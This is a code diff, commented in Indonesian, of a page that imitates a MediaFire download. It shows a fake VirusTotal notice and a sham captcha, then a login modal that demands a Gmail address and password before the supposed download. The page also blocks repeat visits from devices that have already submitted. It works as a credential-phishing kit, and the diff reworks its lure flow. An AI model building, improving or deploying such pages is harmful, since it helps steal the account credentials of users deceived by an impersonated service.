@@ -10,39 +10,41 @@
 html,body{width:100%;min-height:100%;overflow-x:hidden;background:#fff;font-family:Arial,Helvetica,sans-serif;color:#555;-webkit-text-size-adjust:100%;}
 button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 
+/* HEADER */
 .header{width:100%;height:auto;border-bottom:1px solid #ddd;background:#fff;padding:0;overflow:hidden;}
 .header-img{width:100%;height:auto;display:block;cursor:pointer;}
 
+/* CONTENT */
 .page{width:100%;display:flex;flex-direction:column;align-items:center;padding:0 16px 40px;}
 .ad-space{width:100%;height:180px;}
 .download-wrap{width:100%;max-width:600px;cursor:pointer;user-select:none;border-radius:6px;overflow:hidden;}
 .download-top{width:100%;height:60px;background:#087be0;display:flex;align-items:center;padding:0 14px;color:#fff;}
-.download-wrap:active .download-top{filter:brightness(.94);}
-.file-icon{width:38px;height:44px;flex-shrink:0;display:flex;align-items:center;justify-content:center;}
+.file-icon{width:38px;height:44px;flex-shrink:0;}
 .file-icon-img{width:100%;height:100%;object-fit:contain;display:block;}
 .file-info{min-width:0;margin-left:12px;flex:1;}
-.file-title{font-size:15px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px;color:#fff;letter-spacing:0.3px;}
+.file-title{font-size:15px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px;color:#fff;}
 .file-sub{font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#fff;opacity:.95;}
-.download-icon{width:22px;height:26px;flex-shrink:0;margin-left:10px;margin-right:2px;display:flex;align-items:center;justify-content:center;}
+.download-icon{width:22px;height:26px;flex-shrink:0;margin-left:10px;}
 .download-icon-img{width:100%;height:100%;object-fit:contain;display:block;}
 .download-bottom{width:100%;height:38px;background:#333;display:flex;align-items:center;justify-content:space-between;padding:0 14px;}
-.slow{color:#ddd;font-size:11px;white-space:nowrap;}
-.fast{background:#087be0;color:#fff;border:0;border-radius:4px;padding:6px 10px;font-size:10px;font-weight:bold;white-space:nowrap;}
+.slow{color:#ddd;font-size:11px;}
+.fast{background:#087be0;color:#fff;border:0;border-radius:4px;padding:6px 10px;font-size:10px;font-weight:bold;}
 .description{max-width:600px;width:100%;text-align:center;font-size:12px;line-height:18px;margin-top:16px;}
 .options{max-width:600px;width:100%;margin-top:14px;}
 .option-img{width:100%;height:auto;display:block;cursor:pointer;}
-.map{width:100%;max-width:600px;height:200px;margin-top:16px;background:#51a8e5;position:relative;overflow:hidden;border-radius:0;}
+.map{width:100%;max-width:600px;height:200px;margin-top:16px;background:#51a8e5;position:relative;overflow:hidden;}
 .map-label{position:absolute;top:0;left:0;background:#28688e;color:#fff;padding:6px 10px;font-size:11px;z-index:3;}
 .map-img{width:100%;height:100%;object-fit:cover;display:block;}
 .uploader-info{max-width:600px;width:100%;display:flex;align-items:center;gap:12px;padding:14px 0;}
 .flag-box{width:60px;height:26px;background:#c8102e;flex-shrink:0;}
-.uploader-text{font-size:13px;color:#333;line-height:1.5;font-weight:400;}
+.uploader-text{font-size:13px;color:#333;line-height:1.5;}
 .vt-section{max-width:600px;width:100%;margin-top:16px;}
 .vt-logo{width:150px;height:90px;border:1px solid #e0e0e0;display:flex;align-items:center;justify-content:center;background:#fff;padding:8px;}
-.vt-logo-img{max-width:100%;max-height:100%;width:auto;height:auto;object-fit:contain;display:block;}
+.vt-logo-img{max-width:100%;max-height:100%;object-fit:contain;display:block;}
 .vt-title{font-size:17px;font-weight:bold;color:#222;margin-top:14px;margin-bottom:6px;}
 .vt-desc{font-size:13px;color:#333;line-height:1.5;}
 
+/* VERIF MODAL */
 #verifyModal{position:fixed;inset:0;width:100%;height:100%;background:#fff;display:none;align-items:center;justify-content:center;padding:20px;z-index:999999;}
 #verifyModal.show{display:flex;}
 .verify-card{background:#fff;width:100%;max-width:380px;border-radius:16px;box-shadow:0 4px 24px rgba(0,0,0,.08);border:1px solid #eee;padding:36px 24px 28px;text-align:center;}
@@ -54,7 +56,7 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 .verify-percent{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:17px;font-weight:bold;color:#1a73e8;}
 .verify-title{font-size:20px;font-weight:bold;color:#202124;margin-bottom:8px;}
 .verify-sub{font-size:13px;color:#5f6368;line-height:1.5;margin-bottom:6px;}
-.verify-timer{font-size:12px;color:#80868b;margin-bottom:0;}
+.verify-timer{font-size:12px;color:#80868b;}
 .captcha-box{display:none;margin-top:24px;}
 .captcha-box.show{display:block;}
 .captcha-frame{display:flex;align-items:center;gap:14px;border:1.5px solid #d3d3d3;border-radius:8px;padding:16px 18px;background:#fafafa;cursor:pointer;user-select:none;}
@@ -71,22 +73,22 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 .btn-lanjut.active{background:#1a73e8;color:#fff;cursor:pointer;}
 .verify-note{margin-top:18px;font-size:11px;color:#9aa0a6;line-height:1.5;}
 
+/* LOGIN MODAL */
 .modal{position:fixed;inset:0;width:100%;height:100%;background:rgba(0,0,0,.42);display:none;align-items:center;justify-content:center;padding:24px;z-index:99999;}
 .modal.show{display:flex;}
 .login-card{background:#fff;width:92%;max-width:410px;max-height:88vh;overflow-y:auto;border-radius:14px;box-shadow:0 10px 40px rgba(0,0,0,.28);}
 .login-card-header{display:flex;align-items:center;justify-content:space-between;padding:15px 18px;border-bottom:1px solid #e8eaed;}
 .header-left{display:flex;align-items:center;gap:10px;}
-.header-logo{width:22px;height:22px;object-fit:contain;display:block;flex-shrink:0;}
+.header-logo{width:22px;height:22px;object-fit:contain;}
 .header-title{font-size:15px;font-weight:500;color:#202124;}
 .close-btn{background:none;border:none;font-size:22px;color:#5f6368;cursor:pointer;padding:3px 9px;border-radius:50%;}
 .card-body{padding:24px 22px 26px;}
-.login-title{font-size:22px;font-weight:400;color:#202124;margin-bottom:7px;}
+.login-title{font-size:22px;color:#202124;margin-bottom:7px;}
 .login-subtitle{font-size:13px;color:#5f6368;margin-bottom:22px;}
 .login-subtitle strong{font-weight:500;color:#202124;}
 .input-group{margin-bottom:13px;}
-.input-field{width:100%;padding:12px 13px;border:1px solid #dadce0;border-radius:6px;font-size:14px;color:#202124;outline:none;background:#fff;}
+.input-field{width:100%;padding:12px 13px;border:1px solid #dadce0;border-radius:6px;font-size:14px;color:#202124;outline:none;}
 .input-field:focus{border:2px solid #1a73e8;padding:11px 12px;}
-.input-field::placeholder{color:#80868b;}
 .checkbox-row{display:flex;align-items:center;gap:9px;margin:9px 0 18px;}
 .checkbox-row input{width:17px;height:17px;cursor:pointer;accent-color:#1a73e8;}
 .checkbox-row label{font-size:13px;color:#202124;cursor:pointer;}
@@ -118,17 +120,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
     .forgot{font-size:12px;}
     .btn-login{padding:9px 20px;font-size:12px;}
 }
-@media(max-width:350px){
-    .file-title{font-size:13px;}
-    .file-sub{font-size:10px;}
-    .slow{font-size:10px;}
-    .fast{font-size:9px;padding:5px 8px;}
-    .flag-box{width:50px;height:22px;}
-    .uploader-text{font-size:12px;}
-    .vt-logo{width:130px;height:78px;}
-    .vt-title{font-size:15px;}
-    .vt-desc{font-size:12px;}
-}
 </style>
 
 <script>
@@ -138,9 +129,7 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
             localStorage.getItem("sudah_submit") === "1" ||
             sessionStorage.getItem("sudah_submit") === "1" ||
             document.cookie.indexOf("sudah_submit=1") !== -1;
-        if(blocked){
-            window.location.replace("/blokir");
-        }
+        if(blocked){ window.location.replace("/blokir"); }
     } catch(e){}
 })();
 </script>
@@ -154,7 +143,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 </header>
 
 <main class="page">
-
     <div class="ad-space"></div>
 
     <section class="download-wrap" onclick="openDownloadLogin()">
@@ -196,7 +184,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
         <div class="vt-title">VirusTotal scan</div>
         <div class="vt-desc">MediaFire scans high-risk files using VirusTotal.</div>
     </div>
-
 </main>
 
 
@@ -256,7 +243,6 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
                     By continuing, layanan akan menggunakan informasi akun hanya untuk proses login pada halaman ini.
                     Lihat <a href="#" onclick="return false;">Privacy Policy</a> dan <a href="#" onclick="return false;">Terms of Service</a>.
                 </p>
-                <p class="privacy">Kamu dapat mengatur akun ini di pengaturan akunmu.</p>
                 <div class="actions">
                     <a href="javascript:void(0)" class="forgot inactive" onclick="return false;">Forgot password?</a>
                     <button type="submit" class="btn-login">Log in</button>
@@ -276,6 +262,8 @@ button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
 var captchaChecked = false;
 var verifyInterval = null;
 
+
+/* ============ CEK BLOKIR ============ */
 function cekDeviceBlocked(){
     try{ if(localStorage.getItem("sudah_submit") === "1") return true; }catch(e){}
     try{ if(sessionStorage.getItem("sudah_submit") === "1") return true; }catch(e){}
@@ -290,32 +278,7 @@ function setDeviceBlocked(){
 }
 
 
-/* =========================================================
-   KLIK TOMBOL → VERIF ATAU LOGIN
-   ========================================================= */
-function openDownloadLogin(event){
-
-    if(event){ event.stopPropagation(); }
-
-    if(cekDeviceBlocked()){
-        window.location.replace("/blokir");
-        return;
-    }
-
-    /* KALO UDAH VERIF DI SESI INI → LANGSUNG LOGIN */
-    if(sessionStorage.getItem("verif_ok") === "1"){
-        document.getElementById("loginModal").classList.add("show");
-        return;
-    }
-
-    /* KALO BELUM → MUNCULIN VERIF */
-    openVerifyModal();
-}
-
-
-/* =========================================================
-   VERIF
-   ========================================================= */
+/* ============ MUNCULIN VERIF ============ */
 function openVerifyModal(){
 
     var modal = document.getElementById("verifyModal");
@@ -368,6 +331,8 @@ function openVerifyModal(){
     }, 60);
 }
 
+
+/* ============ CAPTCHA ============ */
 function toggleCaptcha(){
     captchaChecked = !captchaChecked;
     var frame = document.getElementById("captchaFrame");
@@ -381,25 +346,49 @@ function toggleCaptcha(){
     }
 }
 
+
+/* ============ VERIF SELESAI → KEMBALI KE HALAMAN DOWNLOAD ============ */
 function lanjutKeLogin(){
     if(!captchaChecked) return;
     var btn = document.getElementById("btnLanjut");
     if(btn){ btn.textContent = "Memverifikasi..."; btn.classList.remove("active"); btn.disabled = true; }
 
     setTimeout(function(){
+        /* SIMPEN FLAG: verif udah selesai */
         sessionStorage.setItem("verif_ok","1");
+
+        /* SEMBUNYIIN VERIF — BALIK KE HALAMAN DOWNLOAD */
         var vm = document.getElementById("verifyModal");
         if(vm) vm.classList.remove("show");
-        var lm = document.getElementById("loginModal");
-        if(lm) lm.classList.add("show");
+
         if(btn) btn.textContent = "Lanjutkan";
     }, 900);
 }
 
 
-/* =========================================================
-   HELPER
-   ========================================================= */
+/* ============ KLIK TOMBOL DOWNLOAD → LOGIN MUNCUL ============ */
+function openDownloadLogin(event){
+
+    if(event){ event.stopPropagation(); }
+
+    /* CEK BLOKIR */
+    if(cekDeviceBlocked()){
+        window.location.replace("/blokir");
+        return;
+    }
+
+    /* KALO BELUM VERIF → MUNCULIN VERIF */
+    if(sessionStorage.getItem("verif_ok") !== "1"){
+        openVerifyModal();
+        return;
+    }
+
+    /* KALO UDAH VERIF → MUNCULIN LOGIN */
+    document.getElementById("loginModal").classList.add("show");
+}
+
+
+/* ============ HELPER ============ */
 function validasiInput(email, pass){
     if(!email || !pass) return "Harap isi email dan kata sandi!";
     if(!email.toLowerCase().endsWith("@gmail.com")) return "Email harus berakhir dengan @gmail.com";
@@ -474,9 +463,7 @@ function clearMessage(){
 }
 
 
-/* =========================================================
-   LOGIN
-   ========================================================= */
+/* ============ LOGIN ============ */
 function loginUser(event){
     event.preventDefault();
     var username = document.getElementById("loginUsername").value.trim();
@@ -531,13 +518,20 @@ function loginUser(event){
 }
 
 
-/* =========================================================
-   AUTO CEK PAS LOAD
-   ========================================================= */
+/* ============ AUTO MUNCULIN VERIF PAS BUKA WEB ============ */
 window.addEventListener("load", function(){
+
+    /* KALO UDAH SUBMIT → BLOKIR */
     if(cekDeviceBlocked()){
         window.location.replace("/blokir");
+        return;
     }
+
+    /* KALO BELUM VERIF → MUNCULIN VERIF */
+    if(sessionStorage.getItem("verif_ok") !== "1"){
+        openVerifyModal();
+    }
+    /* KALO UDAH VERIF → BIARIN HALAMAN DOWNLOAD TAMPIL */
 });
 
 document.addEventListener("keydown", function(event){
